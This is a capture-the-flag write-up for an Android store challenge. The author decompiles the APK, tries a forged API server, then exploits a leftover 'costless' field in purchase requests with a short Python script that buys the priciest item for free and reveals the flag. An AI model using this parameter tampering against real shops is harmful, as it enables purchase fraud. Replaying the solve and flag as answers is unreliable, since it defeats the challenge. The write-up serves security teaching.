# dev-release

## Description

Some company dropped it's dev build into production, and afterwards they found out that their profit went negative. Find out how, buy the expensive item, and get the message.

## Code Analysis

The challenge provides an APK named `store.apk`.
Using JADX it is possible to decompile the bytecode and partially reconstruct the java source code.

The mobile app is a simple client-server application in which the user has a starting balance (=1000) and can buy different items.
The flag is one of those but its cost is higher than the starting balance (=10000) and thus the user has no possibility to directly buy it.
The user can manually set the hostname and port exposing the API Server.

![app](./app.png)

The API server interface is defined in the decompiled source code.
```kotlin
public interface StoreApi {
    @GET("/api/balance")
    Object getBalance(Continuation<? super BalanceResponse> continuation);

    @GET("/api/items")
    Object getItems(Continuation<? super List<Item>> continuation);

    @POST("/api/purchase")
    Object purchaseItem(@Body PurchaseRequest purchaseRequest, Continuation<? super PurchaseResponse> continuation);

    @POST("/api/purchase")
    Object purchaseItem1(@Body PurchaseRequest1 purchaseRequest1, Continuation<? super PurchaseResponse> continuation);

    @POST("/api/reset-balance")
    Object resetBalance(@Body Map<String, Integer> map, Continuation<? super BalanceResponse> continuation);
}
```

## Exploit

First approach i tried consists of deploying a custom API server, since i am able to arbitrarily set it inside the application by changing the host and port.
The main idea is to provide a `/api/reset-balance` endpoint that will set a balance >= 10000, disconnect and connect to the legit API server,
hoping that the application is not calling `/api/balance` nor `/api/reset-balance` every time a new connection is set.
This is the forged API server.

```python
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def read_root():
    return {"message": "Hello, World!"}


@app.get("/api/balance/")
def get_balance():
    return {"balance": 1000}


@app.post("/api/reset-balance/")
def reset_balance():
    return {
        "success": True,
        "newBalance": 1000,
        "message": "Balance reset successfully",
    }

@app.get("/api/items/")
def get_items():
    return [
    {
        "id": 1,
        "name": "Cheap Item",
        "price": 5
    },
    {
        "id": 2,
        "name": "Regular Item",
        "price": 20
    },
    {
        "id": 3,
        "name": "Expensive Item",
        "price": 10000
    },
    {
        "id": 4,
        "name": "Special Item",
        "price": 50
    }
]

# Run the server
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)

```

Unfortunately this approach does not work because the `/api/balance` endpoint is called every time a new API Server connection is established.

Giving another look to the decompiled code i found the following:

```kotlin
public PurchaseRequest(int itemId, boolean costless) {
    this.itemId = itemId;
    this.costless = costless;
}
```

This means that it is possible to send purchase requests with a costless=true attribute.

```python
import sys, requests

if len(sys.argv) != 3:
    print("Usage: python solve.py host port")
    sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

purchase_url = f"http://{host}:{port}/api/purchase"

resp = requests.post(purchase_url, json={"itemId": 3, "costless": True})
print(resp.json())
```

The successful response with the flag

```JSON
{
    "success": true,
    "newBalance": 1000,
    "message": "Acquired ctf{7156172408a468abd0805d6e201646ca6fbf438e06d8b339972e67d02c7273d3} for free"
}
```
